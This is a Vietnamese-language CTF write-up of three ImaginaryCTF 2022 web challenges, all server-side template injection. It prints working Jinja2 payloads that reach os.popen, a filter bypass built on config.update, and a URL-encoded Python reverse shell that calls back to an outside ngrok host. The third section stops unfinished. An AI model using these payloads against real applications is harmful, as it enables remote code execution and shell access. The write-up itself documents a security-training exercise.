---
title: "Imaginary CTF 2022"
author: "mtiennnnn"
tags: write-up web
---
{% comment %}
# SSTI Golf

Đề bài cho thẳng source có lỗi SSTI như sau

```python
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 48:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```

Check param `query` tại `/ssti` và giới hạn độ dài là 48. Bài này thì easy rồi nên mình cho thẳng payload mình hay dùng.

```python
{{lipsum.__globals__.os.popen('nl *').read()}}
```

![image](https://user-images.githubusercontent.com/75429369/179644681-16ad9d92-6c4c-4e2f-896a-46d4e4f950a8.png)

# minigolf

Một bài SSTI khác nhưng lần này khó hơn ở chỗ tác giả đã filter thêm một số ký tự `{{` `[` `_`

```python
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

Ban đầu mình cũng cố gắng chắp vá payload bằng những cách thường dùng như dùng `attr|` `dict` nhưng độ dài là rất ít (<= 69).

Sau một hồi thì mình có tham khảo được trang [này](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)

Đại khái ý tưởng ở đây sẽ là chèn một chuỗi với độ dài tuỳ thích vào một biến nào đó trong file `config`, sau đó ta sẽ `popen` tới nó để sử dụng. Mình test thử nhé. Đầu tiên ta sẽ lưu chuỗi như ý muốn vào `config.a`

Ban đầu mình thử với payload sau nhưng không được

```
?txt={%set t=config.update(a=request.args('a')))%}&a=this is a test mtiennnnn
```

Mình không hiểu tại sao payload này lại không work :) (có ai biết chỉ mình với nha), sau đó mình cho hẳn cái `request.args` thành một biến khác thì lại work.

```
?txt={%set o=request.args%}{%set b=config.update(a=o.t)%}&t=this is a test mtiennnnn
```

Đọc thử `config.a` thì đã thấy chuỗi mình nhập

![image](https://user-images.githubusercontent.com/75429369/179645383-e56b8dfc-e37a-4b05-a2f1-d91fdebfe75f.png)

Vậy là đạt được mục đích rồi, giờ chỉ cần set up reverse shell nữa là xong

```
?txt={%set%20o=request.args%}{%set%20b=config.update(a=o.t)%}&t=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28"0.tcp.ap.ngrok.io"%2C14474%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B"%2Fbin%2Fsh"%2C"-i"%5D%29%3B%27
```

Check lại `config.a` lần nữa cho chắc

![image](https://user-images.githubusercontent.com/75429369/179646144-de31d54a-441f-4893-baec-304beed007ee.png)

Oke popen nó là ta có thể rce được rồi

```
?txt={%set o=request.args%}{%set b=(lipsum|attr(o.t)).os.popen(config.a)%}&t=__globals__
```

![image](https://user-images.githubusercontent.com/75429369/179646491-6aa503cd-b5ea-49ab-b92c-572f3a32baab.png)

_Note: bài này mình cứ ghi thiếu ngoặc với thiếu kí tự gì đấy nên cứ 500 miết =))_

# 1337

```javascript
import mojo from "@mojojs/core";
import Path from "@mojojs/path";

const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};

const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);

const layout = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1337</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <main>
        <%== ctx.content.main %>
    </main>
    <canvas width="500" height="200" id="canv" />
    <script src="static/matrix.js"></script>
</body>
</html>`;

const indexTemplate = `
<h1>C0NV3R7 70/FR0M L337</h1>
<form id="leetform" action="/">
    <input type="text" id="text" name="text" placeholder="Your text here">
    <div class="switch-field">
        <input type="radio" id="dir-to" name="dir" value="to" checked="checked">
        <label for="dir-to">TO</label>
        <input type="radio" id="dir-from" name="dir" value="from">
        <label for="dir-from">FROM</label>
    </div>
    <input type="submit" value="SUBMIT">
</form>
<div id="links">
  <a href="/source">/source</a>
  <a href="/docker">/docker</a>
</div>
`;

const app = mojo();

const leetify = (text, dir) => {
  const charBlocked = ["'", "`", '"'];
  const charMap = dir === "from" ? fromLeet : toLeet;

  const processed = Array.from(text)
    .map((c) => {
      if (c.toUpperCase() in charMap) {
        return charMap[c.toUpperCase()];
      }

      if (charBlocked.includes(c)) {
        return "";
      }

      return c;
    })
    .join("");

  return `<h1>${processed}</h1><a href="/">â†BACK</a>`;
};

app.get("/", async (ctx) => {
  const params = await ctx.params();
  if (params.has("text")) {
    return ctx.render({
      inline: leetify(params.get("text"), params.get("dir")),
      inlineLayout: layout,
    });
  }
  ctx.render({ inline: indexTemplate, inlineLayout: layout });
});

app.get("/source", async (ctx) => {
  const readable = new Path("index.js").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.get("/docker", async (ctx) => {
  const readable = new Path("Dockerfile").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.start();
```

Tiếp tục là một bài SSTI (được dịp ôn SSTI gớm), ở bài này nó sẽ convert một số ký tự từ chữ sang số và ngược lại. (btw, payload test ssti `<%== 7*7%>`).

Ngoài convert những kí tự như trên thì ở hàm `leetify`, tác giả còn chặn những kí tự như `'` `"` ```
Tiếp cận bài này ban đầu của mình là mình đi theo hướng URLencode nhưng không hợp lí vì lấy ví dụ `'` là %27 thì số 7 đã bị block.
 an com ti viet tiepa











